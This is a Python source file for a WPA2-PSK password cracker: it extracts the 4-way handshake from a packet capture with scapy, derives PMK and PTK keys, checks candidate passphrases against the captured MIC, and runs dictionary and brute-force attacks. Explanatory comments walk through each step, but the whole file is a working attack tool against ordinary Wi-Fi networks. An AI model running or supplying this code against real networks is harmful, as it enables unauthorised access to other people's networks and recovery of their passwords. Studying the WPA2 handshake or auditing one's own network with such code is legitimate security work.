import scapy.all as scapy
from pbkdf2 import PBKDF2
import hmac
import hashlib
import struct
import itertools
import string


class WPA2Cracker:
    """
    WPA2 Dictionary Attack Tool

    This tool performs a dictionary attack on WPA2-PSK networks by:
    1. Extracting the 4-way handshake from a pcap file
    2. Deriving cryptographic keys from password candidates
    3. Verifying passwords by comparing computed vs captured MIC values
    """

    def __init__(self, capture_file, ssid):
        self.capture_file = capture_file
        self.ssid = ssid
        self.handshake_data = None

    def extract_handshake(self):
        """
        STEP 1: Extract WPA2 4-way handshake from .pcap or .cap

        Correctly identifies ANonce and SNonce from monitor-mode captures.
        """
        packets = scapy.rdpcap(self.capture_file)
        eapol_packets = [
            p for p in packets if p.haslayer(scapy.EAPOL) and p.haslayer(scapy.Dot11)
        ]
        """
        p.haslayer(scapy.EAPOL) -> Whether the packet contains an EAPOL layer
        p.haslayer(scapy.Dot11) -> The packet is a Wi-Fi (802.11) frame
        """

        if len(eapol_packets) < 2:
            print("❌ Insufficient EAPOL packets for handshake")
            return None

        eapol_packets.sort(key=lambda x: x.time)
        anonce = snonce = ap_mac = client_mac = mic = mic_data = None

        for pkt in eapol_packets:
            eapol_raw = bytes(pkt[scapy.EAPOL])
            if len(eapol_raw) < 97:
                continue
            """
            pkt[scapy.EAPOL] accesses the EAPOL part 
            bytes(...) converts that part into a raw byte sequence
            the EAPOL frame is at least 97 bytes long
            MIC field is located at 81-96 (16 bytes long)
            """

            key_info = struct.unpack(">H", eapol_raw[5:7])[0]
            """
            ">H" -> convert to integer
            Key Information (1/2/3/4)
            """
            key_nonce = eapol_raw[17:49]
            key_mic = eapol_raw[81:97]

            ack = bool(key_info & 0x0080)
            """
            bit 7 -> Key ACK (AP is acknowledging the key exchange.)
            """
            mic_flag = bool(key_info & 0x0100)
            """
            bit 8 -> MIC is present in this message.
            """
            pairwise = bool(key_info & 0x0008)
            """ 
            bit 3 -> A pairwise (client-specific) key, not a group key.
            """

            dot11 = pkt[scapy.Dot11]
            """
            extracts the 802.11 (Wi-Fi) layer
            addr1: Dest MAC (Receiver)
            addr2: Src MAC (Transmitter)
            addr3: BSSID (the AP)
            """

            def mac_clean(mac): return mac.replace(":", "").lower() if mac else None
            """ 
            removing colons (:) and convert lowercase
            """

            if pairwise and ack and not mic_flag and not anonce:
                # Message 1 (ANonce): AP → STA
                anonce = key_nonce
                ap_mac = mac_clean(dot11.addr2)
                client_mac = mac_clean(dot11.addr1)

            elif pairwise and mic_flag and not ack and not snonce:
                # Message 2 (SNonce + MIC): STA → AP
                snonce = key_nonce
                mic = key_mic
                mic_data = eapol_raw[:81] + b"\x00" * 16 + eapol_raw[97:]
                """
                When verifying or computing the MIC, we must zero out the existing MIC field.
                The MIC is calculated over the entire EAPOL frame.
                But we cannot include the MIC itself in the calculation (circular dependency).
                """

        if not all([anonce, snonce, ap_mac, client_mac, mic, mic_data]):
            print("❌ Failed to extract full handshake")
            return None

        self.handshake_data = {
            "anonce": anonce,
            "snonce": snonce,
            "ap_mac": ap_mac,
            "client_mac": client_mac,
            "mic": mic,
            "mic_data": mic_data,
        }

        print(f"✓ Handshake extracted: AP={ap_mac}, Client={client_mac}")
        return self.handshake_data

    def derive_ptk(self, passphrase):
        """
        STEP 2: Derive Pairwise Transient Key (PTK) from passphrase

        Purpose: Generate cryptographic keys for MIC verification
        Process:
        - PMK = PBKDF2(passphrase, SSID, 4096 iterations) [RFC 2898]
        - PTK = PRF(PMK, "Pairwise key expansion", MAC1||MAC2||Nonce1||Nonce2)
        - Return KCK (first 16 bytes) for MIC calculation
        """
        # Step 1: Derive Pre-Shared Master Key using PBKDF2
        pmk = PBKDF2(passphrase, self.ssid.encode("utf-8"), 4096).read(32)
        """
        Uses the PBKDF2 algorithm
        self.ssid.encode("utf-8") -> (PBKDF2 requires bytes).
        4096 -> Number of hash iterations
        Reads the first 32 bytes (256 bits) of the derived key.
        """

        # Step 2: Sort MAC addresses and nonces (lexicographically)
        mac1, mac2 = bytes.fromhex(self.handshake_data["ap_mac"]), bytes.fromhex(
            self.handshake_data["client_mac"]
        )
        nonce1, nonce2 = self.handshake_data["anonce"], self.handshake_data["snonce"]

        mac_data = (mac1 + mac2) if mac1 < mac2 else (mac2 + mac1)
        nonce_data = (nonce1 + nonce2) if nonce1 < nonce2 else (nonce2 + nonce1)

        # Step 3: Generate PTK using Pseudo-Random Function
        ptk = self._prf(pmk, b"Pairwise key expansion\x00", mac_data + nonce_data, 64)
        """
        b"Pairwise key expansion\x00":
        A constant string (label) used in PTK derivation. \x00 (null byte), as required by WPA2 spec.
        WPA2 uses a 512-bit PTK (64 bytes) composed of:
        16 bytes for KCK (Key Confirmation Key)
        16 bytes for KEK (Key Encryption Key)
        16 bytes for TK (Temporal Key)
        16 bytes for Michael MIC Key (not used in WPA2)
        """
        return ptk[:16]  # Return KCK (Key Confirmation Key)

    def _prf(self, key, prefix, data, length):
        """Pseudo-Random Function implementation using HMAC-SHA1"""
        """
        This function implements a pseudo-random function (PRF) using HMAC-SHA1, 
        which is required by the WPA2 specification to expand the PMK (32 bytes) 
        into the PTK (64 bytes).
        """
        result, counter = b"", 0
        while len(result) < length:
            result += hmac.new(
                key, prefix + data + bytes([counter]), hashlib.sha1
            ).digest()
            counter += 1
        return result[:length]

    def verify_passphrase(self, passphrase):
        """
        STEP 3: Verify passphrase by comparing MIC values

        Purpose: Check if candidate password generates matching MIC
        Process:
        - Derive KCK from passphrase using PTK derivation
        - Compute MIC = HMAC-SHA1(KCK, EAPOL_frame_with_zeroed_MIC)[:16]
        - Compare with captured MIC from handshake
        """
        try:
            kck = self.derive_ptk(passphrase)
            computed_mic = hmac.new(
                kck, self.handshake_data["mic_data"], hashlib.sha1
            ).digest()[:16]
            return computed_mic == self.handshake_data["mic"]
        except:
            return False

    def dictionary_attack(self, dictionary_file):
        """
        STEP 4: Perform dictionary attack

        Purpose: Test password candidates until correct one is found
        Process: Iterate through dictionary and verify each password
        """
        if not self.handshake_data:
            print("❌ No handshake data available")
            return None

        try:
            with open(dictionary_file, "r", encoding="utf-8", errors="ignore") as f:
                passwords = [line.strip() for line in f if 8 <= len(line.strip()) <= 63]
        except Exception as e:
            print(f"❌ Dictionary error: {e}")
            return None

        print(f"🔍 Testing {len(passwords)} passwords...")

        for i, pwd in enumerate(passwords, 1):
            if self.verify_passphrase(pwd):
                print(f"🎉 PASSWORD FOUND: {pwd}")
                return pwd
            if i % 100 == 0:
                print(f"   Tested {i}/{len(passwords)} passwords...")

        print("❌ Password not found in dictionary")
        return None

    def brute_force_attack(self, charset=None, min_length=1, max_length=8):
        """
        STEP 5: Perform brute force attack

        Purpose: Test all possible character combinations up to specified length
        Process: Generate and test all permutations of characters
        
        Args:
            charset (str): Character set to use (default: lowercase + digits)
            min_length (int): Minimum password length to test
            max_length (int): Maximum password length to test
        """
        if not self.handshake_data:
            print("❌ No handshake data available")
            return None

        # Default character set: lowercase letters + digits
        if charset is None:
            charset = string.ascii_lowercase + string.digits
        
        print(f"🔨 Starting brute force attack...")
        print(f"   Character set: {charset}")
        print(f"   Length range: {min_length}-{max_length}")
        print(f"   Total combinations: {sum(len(charset)**i for i in range(min_length, max_length + 1)):,}")
        
        tested_count = 0
        
        for length in range(min_length, max_length + 1):
            print(f"   Testing length {length}...")
            
            # Generate all combinations of the specified length
            for combo in itertools.product(charset, repeat=length):
                password = ''.join(combo)
                tested_count += 1
                
                if self.verify_passphrase(password):
                    print(f"🎉 PASSWORD FOUND: {password}")
                    print(f"   Tested {tested_count:,} combinations")
                    return password
                
                # Progress indicator every 1000 attempts
                if tested_count % 1000 == 0:
                    print(f"   Tested {tested_count:,} combinations...")
        
        print(f"❌ Password not found after testing {tested_count:,} combinations")
        return None


